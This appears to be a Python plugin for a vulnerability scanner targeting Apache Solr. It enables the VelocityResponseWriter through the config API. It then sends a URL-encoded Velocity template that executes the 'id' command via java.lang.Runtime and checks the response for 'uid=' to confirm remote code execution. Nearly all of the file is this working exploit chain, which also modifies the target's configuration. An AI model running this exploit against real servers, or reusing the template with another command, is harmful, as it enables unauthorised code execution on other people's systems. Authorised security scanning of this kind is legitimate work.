# coding=utf-8
from lib.Requests import Requests
from lib.verify import verify

# >5? (not sure when config API is introduced) - latest (tested on 8.2.0)

vuln = ['Solr', '8983']
req = Requests()


def send_exp(url):
    payload = r"/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    try:
        r = req.get(url + payload)
        if 'uid=' in r.text:
            return 'Apache Solr RCE via Velocity'
    except Exception:
        pass


def query_config(url):
    payload = '''
        {
          "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
          }
        }'''
    try:
        r = req.post(url + '/solr/test/config', payload)
        if r.status_code == 200 and 'responseHeader' in r.text:
            result = send_exp(url)
            return result
    except Exception:
        pass


def check(url, ip, ports, apps):
    if verify(vuln, ports, apps):
        url = 'http://' + ip + ':8983'
        result = query_config(url)
        if result:
            return result
